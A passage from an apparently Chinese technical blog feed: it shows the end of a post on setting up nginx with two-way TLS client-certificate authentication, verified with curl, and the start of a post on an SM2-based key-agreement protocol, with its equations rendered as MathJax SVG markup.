<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">server {</span><br><span class="line">        listen 443 ssl;</span><br><span class="line">        server_name 192.168.1.4;</span><br><span class="line">        ssl on;</span><br><span class="line">        ssl_certificate /etc/nginx/keys/server.crt;<span class="comment">#配置证书位置</span></span><br><span class="line">        ssl_certificate_key /etc/nginx/keys/server.key;<span class="comment">#配置秘钥位置</span></span><br><span class="line">        ssl_client_certificate /etc/nginx/keys/client.crt;<span class="comment">#双向认证</span></span><br><span class="line">        ssl_verify_client on; <span class="comment">#双向认证</span></span><br><span class="line">        ssl_session_timeout 5m;</span><br><span class="line">        root html;</span><br><span class="line">        index index.html;</span><br><span class="line">        location / {</span><br><span class="line">                try_files <span class="variable">$uri</span> <span class="variable">$uri</span>/ =404;</span><br><span class="line">        }</span><br><span class="line">}</span><br></pre></td></tr></table></figure></li>
<li><p>重载配置</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nginx -s reload</span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="验证"><a href="#验证" class="headerlink" title="验证"></a>验证</h3><ol>
<li>使用同一局域网下的另一台机器访问该nginx服务器<a href="https://192.168.1.4/%EF%BC%9B">https://192.168.1.4/；</a></li>
</ol>
<p>显示如下，需要提供证书才能访问</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200515014308.png"></p>
<ol start="2">
<li><p>将密钥复制到另一个文件夹下，使用curl进行验证</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cp</span> -r /etc/nginx/keys/ /tmp/</span><br><span class="line"><span class="built_in">cd</span> /tmp/keys/</span><br><span class="line">curl --cert ./client.crt --key ./client.key https://192.168.1.4/ -k -v</span><br></pre></td></tr></table></figure>

<p>服务器端与客户端的握手流程如下：</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200515013441.png"></p>
<p>数据包相关参数如下图：</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200515013715.png"></p>
<p>返回的网页源代码如下，可以正常访问，说明双向认证的Web服务器搭建成功。</p>
<p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/20200515013843.png"></p>
</li>
</ol>
]]></content>
      <categories>
        <category>WEB experiment</category>
      </categories>
      <tags>
        <tag>SM2</tag>
        <tag>SM3</tag>
        <tag>web服务器双向认证</tag>
      </tags>
  </entry>
  <entry>
    <title>基于国密的简易密钥协商协议</title>
    <url>/%E5%9F%BA%E4%BA%8E%E5%9B%BD%E5%AF%86%E7%9A%84%E7%AE%80%E6%98%93%E5%AF%86%E9%92%A5%E5%8D%8F%E5%95%86%E5%8D%8F%E8%AE%AE.html</url>
    <content><![CDATA[<h2 id="目的"><a href="#目的" class="headerlink" title="目的"></a>目的</h2><p>基于国密设计一个简易的密钥协商协议；<span id="more"></span></p>
<h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><h3 id="SM2算法原理"><a href="#SM2算法原理" class="headerlink" title="SM2算法原理"></a>SM2算法原理</h3><p>SM2算法是国家密码管理局于2010年12月17日发布的椭圆曲线公钥密码算法，是ECC（Elliptic Curve Cryptosystem）算法的一种，基于椭圆曲线离散对数问题，计算复杂度是指数级，求解难度较大，同等安全程度要求下，椭圆曲线密码较其他公钥算法所需密钥长度小很多。与RSA算法相比，SM2算法是一种更先进安全的算法。在我们国家商用密码体系中SM2算法被用来替换RSA算法。SM算法作为一种ECC算法，其原理如下：</p>
<ol>
<li>用户A选定一条合适加密的椭圆曲线<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.65ex;" xmlns="http://www.w3.org/2000/svg" width="7.596ex" height="2.347ex" role="img" focusable="false" viewBox="0 -750 3357.3 1037.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D438" d="M492 213Q472 213 472 226Q472 230 477 250T482 285Q482 316 461 323T364 330H312Q311 328 277 192T243 52Q243 48 254 48T334 46Q428 46 458 48T518 61Q567 77 599 117T670 248Q680 270 683 272Q690 274 698 274Q718 274 718 261Q613 7 608 2Q605 0 322 0H133Q31 0 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H757Q764 676 764 669Q764 664 751 557T737 447Q735 440 717 440H705Q698 445 698 453L701 476Q704 500 704 528Q704 558 697 578T678 609T643 625T596 632T532 634H485Q397 633 392 631Q388 629 386 622Q385 619 355 499T324 377Q347 376 372 376H398Q464 376 489 391T534 472Q538 488 540 490T557 493Q562 493 565 493T570 492T572 491T574 487T577 483L544 351Q511 218 508 216Q505 213 492 213Z"></path></g><g data-mml-node="mi" transform="translate(771,-150) scale(0.707)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g></g><g data-mml-node="mo" transform="translate(1176.7,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1565.7,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(2094.7,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(2539.3,0)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g><g data-mml-node="mo" transform="translate(2968.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>，如:<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.464ex;" xmlns="http://www.w3.org/2000/svg" width="16.388ex" height="2.464ex" role="img" focusable="false" viewBox="0 -883.9 7243.6 1088.9"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msup"><g data-mml-node="mi"><path data-c="1D466" d="M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z"></path></g><g data-mml-node="mn" transform="translate(523,413) scale(0.707)"><path data-c="32" d="M109 429Q82 429 66 447T50 491Q50 562 103 614T235 666Q326 666 387 610T449 465Q449 422 429 383T381 315T301 241Q265 210 201 149L142 93L218 92Q375 92 385 97Q392 99 409 186V189H449V186Q448 183 436 95T421 3V0H50V19V31Q50 38 56 46T86 81Q115 113 136 137Q145 147 170 174T204 211T233 244T261 278T284 308T305 340T320 369T333 401T340 431T343 464Q343 527 309 573T212 619Q179 619 154 602T119 569T109 550Q109 549 114 549Q132 549 151 535T170 489Q170 464 154 447T109 429Z"></path></g></g><g data-mml-node="mo" transform="translate(1204.3,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="msup" transform="translate(2260.1,0)"><g data-mml-node="mi"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mn" transform="translate(605,413) scale(0.707)"><path data-c="33" d="M127 463Q100 463 85 480T69 524Q69 579 117 622T233 665Q268 665 277 664Q351 652 390 611T430 522Q430 470 396 421T302 350L299 348Q299 347 308 345T337 336T375 315Q457 262 457 175Q457 96 395 37T238 -22Q158 -22 100 21T42 130Q42 158 60 175T105 193Q133 193 151 175T169 130Q169 119 166 110T159 94T148 82T136 74T126 70T118 67L114 66Q165 21 238 21Q293 21 321 74Q338 107 338 175V195Q338 290 274 322Q259 328 213 329L171 330L168 332Q166 335 166 348Q166 366 174 366Q202 366 232 371Q266 376 294 413T322 525V533Q322 590 287 612Q265 626 240 626Q208 626 181 615T143 592T132 580H135Q138 579 143 578T153 573T165 566T175 555T183 540T186 520Q186 498 172 481T127 463Z"></path></g></g><g data-mml-node="mo" transform="translate(3490.9,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(4491.1,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mi" transform="translate(5020.1,0)"><path data-c="1D465" d="M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z"></path></g><g data-mml-node="mo" transform="translate(5814.3,0)"><path data-c="2B" d="M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z"></path></g><g data-mml-node="mi" transform="translate(6814.6,0)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g></g></g></svg></mjx-container>，并取椭圆曲线上一点，作为基点G；</li>
<li>用户A选择一个私有密钥k，并生成公钥<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.339ex;" xmlns="http://www.w3.org/2000/svg" width="2.855ex" height="1.885ex" role="img" focusable="false" viewBox="0 -683 1261.7 833"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D443" d="M287 628Q287 635 230 637Q206 637 199 638T192 648Q192 649 194 659Q200 679 203 681T397 683Q587 682 600 680Q664 669 707 631T751 530Q751 453 685 389Q616 321 507 303Q500 302 402 301H307L277 182Q247 66 247 59Q247 55 248 54T255 50T272 48T305 46H336Q342 37 342 35Q342 19 335 5Q330 0 319 0Q316 0 282 1T182 2Q120 2 87 2T51 1Q33 1 33 11Q33 13 36 25Q40 41 44 43T67 46Q94 46 127 49Q141 52 146 61Q149 65 218 339T287 628ZM645 554Q645 567 643 575T634 597T609 619T560 635Q553 636 480 637Q463 637 445 637T416 636T404 636Q391 635 386 627Q384 621 367 550T332 412T314 344Q314 342 395 342H407H430Q542 342 590 392Q617 419 631 471T645 554Z"></path></g><g data-mml-node="mi" transform="translate(675,-150) scale(0.707)"><path data-c="1D435" d="M231 637Q204 637 199 638T194 649Q194 676 205 682Q206 683 335 683Q594 683 608 681Q671 671 713 636T756 544Q756 480 698 429T565 360L555 357Q619 348 660 311T702 219Q702 146 630 78T453 1Q446 0 242 0Q42 0 39 2Q35 5 35 10Q35 17 37 24Q42 43 47 45Q51 46 62 46H68Q95 46 128 49Q142 52 147 61Q150 65 219 339T288 628Q288 635 231 637ZM649 544Q649 574 634 600T585 634Q578 636 493 637Q473 637 451 637T416 636H403Q388 635 384 626Q382 622 352 506Q352 503 351 500L320 374H401Q482 374 494 376Q554 386 601 434T649 544ZM595 229Q595 273 572 302T512 336Q506 337 429 337Q311 337 310 336Q310 334 293 263T258 122L240 52Q240 48 252 48T333 46Q422 46 429 47Q491 54 543 105T595 229Z"></path></g></g></g></g></svg></mjx-container>：<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.186ex;" xmlns="http://www.w3.org/2000/svg" width="9.62ex" height="1.781ex" role="img" focusable="false" viewBox="0 -705 4252 787"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43E" d="M285 628Q285 635 228 637Q205 637 198 638T191 647Q191 649 193 661Q199 681 203 682Q205 683 214 683H219Q260 681 355 681Q389 681 418 681T463 682T483 682Q500 682 500 674Q500 669 497 660Q496 658 496 654T495 648T493 644T490 641T486 639T479 638T470 637T456 637Q416 636 405 634T387 623L306 305Q307 305 490 449T678 597Q692 611 692 620Q692 635 667 637Q651 637 651 648Q651 650 654 662T659 677Q662 682 676 682Q680 682 711 681T791 680Q814 680 839 681T869 682Q889 682 889 672Q889 650 881 642Q878 637 862 637Q787 632 726 586Q710 576 656 534T556 455L509 418L518 396Q527 374 546 329T581 244Q656 67 661 61Q663 59 666 57Q680 47 717 46H738Q744 38 744 37T741 19Q737 6 731 0H720Q680 3 625 3Q503 3 488 0H478Q472 6 472 9T474 27Q478 40 480 43T491 46H494Q544 46 544 71Q544 75 517 141T485 216L427 354L359 301L291 248L268 155Q245 63 245 58Q245 51 253 49T303 46H334Q340 37 340 35Q340 19 333 5Q328 0 317 0Q314 0 280 1T180 2Q118 2 85 2T49 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Z"></path></g><g data-mml-node="mo" transform="translate(1166.8,0)"><path data-c="3D" d="M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z"></path></g><g data-mml-node="mi" transform="translate(2222.6,0)"><path data-c="1D458" d="M121 647Q121 657 125 670T137 683Q138 683 209 688T282 694Q294 694 294 686Q294 679 244 477Q194 279 194 272Q213 282 223 291Q247 309 292 354T362 415Q402 442 438 442Q468 442 485 423T503 369Q503 344 496 327T477 302T456 291T438 288Q418 288 406 299T394 328Q394 353 410 369T442 390L458 393Q446 405 434 405H430Q398 402 367 380T294 316T228 255Q230 254 243 252T267 246T293 238T320 224T342 206T359 180T365 147Q365 130 360 106T354 66Q354 26 381 26Q429 26 459 145Q461 153 479 153H483Q499 153 499 144Q499 139 496 130Q455 -11 378 -11Q333 -11 305 15T277 90Q277 108 280 121T283 145Q283 167 269 183T234 206T200 217T182 220H180Q168 178 159 139T145 81T136 44T129 20T122 7T111 -2Q98 -11 83 -11Q66 -11 57 -1T48 16Q48 26 85 176T158 471L195 616Q196 629 188 632T149 637H144Q134 637 131 637T124 640T121 647Z"></path></g><g data-mml-node="mo" transform="translate(2965.8,0)"><path data-c="B7" d="M78 250Q78 274 95 292T138 310Q162 310 180 294T199 251Q199 226 182 208T139 190T96 207T78 250Z"></path></g><g data-mml-node="mi" transform="translate(3466,0)"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g></g></g></svg></mjx-container>；</li>
<li>用户A将<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.65ex;" xmlns="http://www.w3.org/2000/svg" width="7.596ex" height="2.347ex" role="img" focusable="false" viewBox="0 -750 3357.3 1037.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D438" d="M492 213Q472 213 472 226Q472 230 477 250T482 285Q482 316 461 323T364 330H312Q311 328 277 192T243 52Q243 48 254 48T334 46Q428 46 458 48T518 61Q567 77 599 117T670 248Q680 270 683 272Q690 274 698 274Q718 274 718 261Q613 7 608 2Q605 0 322 0H133Q31 0 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H757Q764 676 764 669Q764 664 751 557T737 447Q735 440 717 440H705Q698 445 698 453L701 476Q704 500 704 528Q704 558 697 578T678 609T643 625T596 632T532 634H485Q397 633 392 631Q388 629 386 622Q385 619 355 499T324 377Q347 376 372 376H398Q464 376 489 391T534 472Q538 488 540 490T557 493Q562 493 565 493T570 492T572 491T574 487T577 483L544 351Q511 218 508 216Q505 213 492 213Z"></path></g><g data-mml-node="mi" transform="translate(771,-150) scale(0.707)"><path data-c="1D45D" d="M23 287Q24 290 25 295T30 317T40 348T55 381T75 411T101 433T134 442Q209 442 230 378L240 387Q302 442 358 442Q423 442 460 395T497 281Q497 173 421 82T249 -10Q227 -10 210 -4Q199 1 187 11T168 28L161 36Q160 35 139 -51T118 -138Q118 -144 126 -145T163 -148H188Q194 -155 194 -157T191 -175Q188 -187 185 -190T172 -194Q170 -194 161 -194T127 -193T65 -192Q-5 -192 -24 -194H-32Q-39 -187 -39 -183Q-37 -156 -26 -148H-6Q28 -147 33 -136Q36 -130 94 103T155 350Q156 355 156 364Q156 405 131 405Q109 405 94 377T71 316T59 280Q57 278 43 278H29Q23 284 23 287ZM178 102Q200 26 252 26Q282 26 310 49T356 107Q374 141 392 215T411 325V331Q411 405 350 405Q339 405 328 402T306 393T286 380T269 365T254 350T243 336T235 326L232 322Q232 321 229 308T218 264T204 212Q178 106 178 102Z"></path></g></g><g data-mml-node="mo" transform="translate(1176.7,0)"><path data-c="28" d="M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z"></path></g><g data-mml-node="mi" transform="translate(1565.7,0)"><path data-c="1D44E" d="M33 157Q33 258 109 349T280 441Q331 441 370 392Q386 422 416 422Q429 422 439 414T449 394Q449 381 412 234T374 68Q374 43 381 35T402 26Q411 27 422 35Q443 55 463 131Q469 151 473 152Q475 153 483 153H487Q506 153 506 144Q506 138 501 117T481 63T449 13Q436 0 417 -8Q409 -10 393 -10Q359 -10 336 5T306 36L300 51Q299 52 296 50Q294 48 292 46Q233 -10 172 -10Q117 -10 75 30T33 157ZM351 328Q351 334 346 350T323 385T277 405Q242 405 210 374T160 293Q131 214 119 129Q119 126 119 118T118 106Q118 61 136 44T179 26Q217 26 254 59T298 110Q300 114 325 217T351 328Z"></path></g><g data-mml-node="mo" transform="translate(2094.7,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(2539.3,0)"><path data-c="1D44F" d="M73 647Q73 657 77 670T89 683Q90 683 161 688T234 694Q246 694 246 685T212 542Q204 508 195 472T180 418L176 399Q176 396 182 402Q231 442 283 442Q345 442 383 396T422 280Q422 169 343 79T173 -11Q123 -11 82 27T40 150V159Q40 180 48 217T97 414Q147 611 147 623T109 637Q104 637 101 637H96Q86 637 83 637T76 640T73 647ZM336 325V331Q336 405 275 405Q258 405 240 397T207 376T181 352T163 330L157 322L136 236Q114 150 114 114Q114 66 138 42Q154 26 178 26Q211 26 245 58Q270 81 285 114T318 219Q336 291 336 325Z"></path></g><g data-mml-node="mo" transform="translate(2968.3,0)"><path data-c="29" d="M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z"></path></g></g></g></svg></mjx-container>和点（公钥）<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.439ex;" xmlns="http://www.w3.org/2000/svg" width="4.796ex" height="2.034ex" role="img" focusable="false" viewBox="0 -705 2119.7 899"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="mi"><path data-c="1D43E" d="M285 628Q285 635 228 637Q205 637 198 638T191 647Q191 649 193 661Q199 681 203 682Q205 683 214 683H219Q260 681 355 681Q389 681 418 681T463 682T483 682Q500 682 500 674Q500 669 497 660Q496 658 496 654T495 648T493 644T490 641T486 639T479 638T470 637T456 637Q416 636 405 634T387 623L306 305Q307 305 490 449T678 597Q692 611 692 620Q692 635 667 637Q651 637 651 648Q651 650 654 662T659 677Q662 682 676 682Q680 682 711 681T791 680Q814 680 839 681T869 682Q889 682 889 672Q889 650 881 642Q878 637 862 637Q787 632 726 586Q710 576 656 534T556 455L509 418L518 396Q527 374 546 329T581 244Q656 67 661 61Q663 59 666 57Q680 47 717 46H738Q744 38 744 37T741 19Q737 6 731 0H720Q680 3 625 3Q503 3 488 0H478Q472 6 472 9T474 27Q478 40 480 43T491 46H494Q544 46 544 71Q544 75 517 141T485 216L427 354L359 301L291 248L268 155Q245 63 245 58Q245 51 253 49T303 46H334Q340 37 340 35Q340 19 333 5Q328 0 317 0Q314 0 280 1T180 2Q118 2 85 2T49 1Q31 1 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q147 65 216 339T285 628Z"></path></g><g data-mml-node="mo" transform="translate(889,0)"><path data-c="2C" d="M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z"></path></g><g data-mml-node="mi" transform="translate(1333.7,0)"><path data-c="1D43A" d="M50 252Q50 367 117 473T286 641T490 704Q580 704 633 653Q642 643 648 636T656 626L657 623Q660 623 684 649Q691 655 699 663T715 679T725 690L740 705H746Q760 705 760 698Q760 694 728 561Q692 422 692 421Q690 416 687 415T669 413H653Q647 419 647 422Q647 423 648 429T650 449T651 481Q651 552 619 605T510 659Q492 659 471 656T418 643T357 615T294 567T236 496T189 394T158 260Q156 242 156 221Q156 173 170 136T206 79T256 45T308 28T353 24Q407 24 452 47T514 106Q517 114 529 161T541 214Q541 222 528 224T468 227H431Q425 233 425 235T427 254Q431 267 437 273H454Q494 271 594 271Q634 271 659 271T695 272T707 272Q721 272 721 263Q721 261 719 249Q714 230 709 228Q706 227 694 227Q674 227 653 224Q646 221 643 215T629 164Q620 131 614 108Q589 6 586 3Q584 1 581 1Q571 1 553 21T530 52Q530 53 528 52T522 47Q448 -22 322 -22Q201 -22 126 55T50 252Z"></path></g></g></g></svg></mjx-container>传给用户B；</li>
<li>用户B接到信息后 ，将待传输的明文M编码到<mjx-container class="MathJax" jax="SVG" display="true"><svg style="vertical-align: -0.65ex;" xmlns="http://www.w3.org/2000/svg" width="7.596ex" height="2.347ex" role="img" focusable="false" viewBox="0 -750 3357.3 1037.2"><g stroke="currentColor" fill="currentColor" stroke-width="0" transform="scale(1,-1)"><g data-mml-node="math"><g data-mml-node="msub"><g data-mml-node="mi"><path data-c="1D438" d="M492 213Q472 213 472 226Q472 230 477 250T482 285Q482 316 461 323T364 330H312Q311 328 277 192T243 52Q243 48 254 48T334 46Q428 46 458 48T518 61Q567 77 599 117T670 248Q680 270 683 272Q690 274 698 274Q718 274 718 261Q613 7 608 2Q605 0 322 0H133Q31 0 31 11Q31 13 34 25Q38 41 42 43T65 46Q92 46 125 49Q139 52 144 61Q146 66 215 342T285 622Q285 629 281 629Q273 632 228 634H197Q191 640 191 642T193 659Q197 676 203 680H757Q764 676 764 669Q764 664 751 557T737 447Q735 